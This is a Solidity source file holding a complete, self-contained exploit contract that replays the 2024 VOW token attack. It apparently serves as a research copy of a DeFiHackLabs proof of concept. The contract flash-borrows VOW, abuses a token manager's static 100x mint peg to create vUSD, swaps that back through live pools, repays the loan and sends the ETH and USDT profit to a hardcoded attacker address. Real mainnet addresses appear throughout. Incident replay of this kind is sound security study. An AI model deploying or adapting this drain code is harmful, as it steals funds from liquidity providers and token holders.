// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

// Synthetic standalone exploit for the EVM Playground (2024-08-VOW).
// The DeFiHackLabs PoC runs the attack INLINE in the Foundry test contract
// (attacker = address(this), and the flash-swap callback `uniswapV2Call` lives
// on the test itself), so there is no standalone contract to deploy. This
// contract is a faithful, self-contained copy of that inline attack
// (testExploit -> run, uniswapV2Call, getAmount1Out) so the playground can
// deploy it and record run(). Logic and constants are copied verbatim from
// test/VOW_exp.sol.
//
// Root cause: VSCTokenManager.tokensReceivedVOW() burns any non-merchant
// sender's VOW and mints vUSD at a STATIC admin usdRate peg (1 VOW = 100 vUSD)
// with no market oracle, no cap, and no access control. Because a vUSD/VOW AMM
// also exists, VOW -> (100x) vUSD -> VOW is a self-funding arbitrage loop that a
// single flash-borrowed batch of VOW can exploit for zero capital.

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function decimals() external view returns (uint8);
    function transfer(address, uint256) external returns (bool);
    function transferFrom(address, address, uint256) external returns (bool);
    function approve(address, uint256) external returns (bool);
}

interface IWETH {
    function withdraw(uint256) external;
}

interface IUniPairV2 {
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
}

contract VOWDrain {
    address private constant VOW_WETH_PAIR = 0x7FdEB46b3a0916630f36E886D675602b1007Fcbb;
    address private constant VUSD_VOW_PAIR = 0x97BE09f2523B39B835Da9EA3857CfA1D3C660cBb;
    address private constant VOW_USDT_PAIR = 0x1E49768714E438E789047f48FD386686a5707db2;

    address private constant VSC_TOKEN_MANAGER = 0x184497031808F2b6A2126886C712CC41f146E5dC;
    address private constant VOW = 0x1BBf25e71EC48B84d773809B4bA55B6F4bE946Fb;
    address private constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address private constant VUSD = 0x0fc6C0465C9739d4a42dAca22eB3b2CB0Eb9937A;
    address private constant USDT = 0xdAC17F958D2ee523a2206206994597C13D831ec7;

    address private constant ATTACKER = 0x48de6bF9e301946b0a32b053804c61DC5f00c0c3;

    // step 0: flash-borrow ~all VOW held by the VOW/WETH pair; uniswapV2Call
    // does the mispriced mint + arbitrage, then this liquidates the proceeds.
    function run() external {
        uint256 vowBalance = IERC20(VOW).balanceOf(VOW_WETH_PAIR);
        IUniPairV2(VOW_WETH_PAIR).swap(vowBalance - 1, 0, address(this), hex"00");

        // step 4 (post-callback): keep 10% of the net VOW, sell the rest for
        // ETH via VOW/WETH and for USDT via VOW/USDT.
        vowBalance = IERC20(VOW).balanceOf(address(this));
        IERC20(VOW).transfer(ATTACKER, vowBalance / 10);
        (uint112 reserve0, uint112 reserve1,) = IUniPairV2(VOW_WETH_PAIR).getReserves();
        vowBalance = IERC20(VOW).balanceOf(address(this));
        IERC20(VOW).transfer(VOW_WETH_PAIR, vowBalance / 2);

        uint256 amount0In = IERC20(VOW).balanceOf(VOW_WETH_PAIR) - reserve0;
        uint256 amount1Out = getAmount1Out(reserve0, reserve1, amount0In);
        IUniPairV2(VOW_WETH_PAIR).swap(0, amount1Out, address(this), hex"");
        IWETH(WETH).withdraw(amount1Out);
        (bool success,) = ATTACKER.call{value: amount1Out}("");
        require(success, "Fail to send eth");

        (reserve0, reserve1,) = IUniPairV2(VOW_USDT_PAIR).getReserves();
        IERC20(VOW).transfer(VOW_USDT_PAIR, IERC20(VOW).balanceOf(address(this)));
        amount0In = IERC20(VOW).balanceOf(VOW_USDT_PAIR) - reserve0;
        amount1Out = getAmount1Out(reserve0, reserve1, amount0In);
        IUniPairV2(VOW_USDT_PAIR).swap(0, amount1Out, address(this), hex"");
        (success,) = USDT.call(
            abi.encodeWithSignature("transfer(address,uint256)", ATTACKER, IERC20(USDT).balanceOf(address(this)))
        );
        require(success, "Fail to transfer USDT");
    }

    function uniswapV2Call(address sender, uint256 amount0, uint256, bytes calldata) external {
        require(msg.sender == VOW_WETH_PAIR, "not from pool");
        require(sender == address(this), "not from this contract");

        // step 1: hand the borrowed VOW to the attacker EOA (mirrors the
        // test's pre-approved attacker -> address(this) allowance from setUp).
        IERC20(VOW).transfer(ATTACKER, amount0);

        // step 2: THE BUG. Route the VOW through VSCTokenManager (ERC777
        // tokensReceived hook fires on transferFrom), which burns it and
        // mints 100x its nominal value in vUSD at a stale, un-oracled peg.
        IERC20(VOW).transferFrom(ATTACKER, VSC_TOKEN_MANAGER, amount0);

        // step 3: dump the freshly-minted vUSD into the vUSD/VOW pool,
        // converting the mispriced mint into a much larger VOW balance.
        uint256 vUSDBalance = IERC20(VUSD).balanceOf(ATTACKER);
        IERC20(VUSD).transferFrom(ATTACKER, address(this), vUSDBalance);
        (uint112 reserve0, uint112 reserve1,) = IUniPairV2(VUSD_VOW_PAIR).getReserves();
        IERC20(VUSD).transfer(VUSD_VOW_PAIR, vUSDBalance);

        uint256 amount0In = IERC20(VUSD).balanceOf(VUSD_VOW_PAIR) - reserve0;
        uint256 amount1Out = getAmount1Out(reserve0, reserve1, amount0In);
        IUniPairV2(VUSD_VOW_PAIR).swap(0, amount1Out, address(this), hex"");

        // repay the flash-borrowed VOW (principal + 0.3% Uni-V2 fee).
        uint256 fee = amount0 * 3 / 997 + 1000;
        uint256 amountToPay = amount0 + fee;
        IERC20(VOW).transfer(VOW_WETH_PAIR, amountToPay);
    }

    function getAmount1Out(uint112 reserve0, uint112 reserve1, uint256 amount0In) private pure returns (uint256) {
        return reserve1 * 997 * amount0In / (1000 * reserve0 + 997 * amount0In);
    }

    receive() external payable {}
}
